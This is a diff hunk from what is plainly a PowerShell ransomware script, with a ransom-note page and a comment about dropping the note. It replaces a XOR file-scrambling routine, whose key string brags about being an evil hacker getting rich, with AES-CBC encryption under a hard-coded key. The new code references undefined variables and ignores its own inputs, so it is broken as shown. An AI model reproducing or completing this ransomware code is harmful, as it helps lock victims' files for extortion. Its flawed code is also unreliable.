@@ -44,22 +44,22 @@ $notePage = @"
 </html>
 "@
 
-# inspired from https://gist.github.com/gabemarshall/f25afd533b341e1b21bc39f8e26946b7
+# inspired from https://gist.github.com/PanosGreg/1453e0b0dcaa64e3e02c5cc7b9b43a8c
 function Xor {
     param($in)
-    $key = [System.Text.Encoding]::UTF8.GetBytes("supersecretencryptionkeythatnobodywilleverguessbecausethisissolongitcreatessuchagiantentropyiamanevilhackernobodywilleverstopmeiwillberichthisisamazingmuhahahahahahahahahahahahah")
-
-    $out = $(for ($i = 0; $i -lt $in.length; ) {
-        for ($j = 0; $j -lt $key.length; $j++) {
-            $in[$i] -bxor $key[$j]
-            $i++
-            if ($i -ge $in.Length) {
-                $j = $key.length
-            }
-        }
-    })
+    $key = [System.Text.Encoding]::UTF8.GetBytes("thisisakeythatnoonewillguess!!!1")
+    $aesManaged           = [System.Security.Cryptography.AesManaged]::new()
+    $aesManaged.Mode      = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize   = 256
+    $aesManaged.Key       = $ByteKey
+    $aesManaged.IV        = $ByteKey[0..15]
+    $encryptor            = $aesManaged.CreateEncryptor()
+    $encryptedData        = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+    $aesManaged.Dispose()
     
-    return $out | ForEach-Object { [byte]($_ -band 0xFF) }
+    return $encryptedData
 }
 
 # Drop and show ransom note
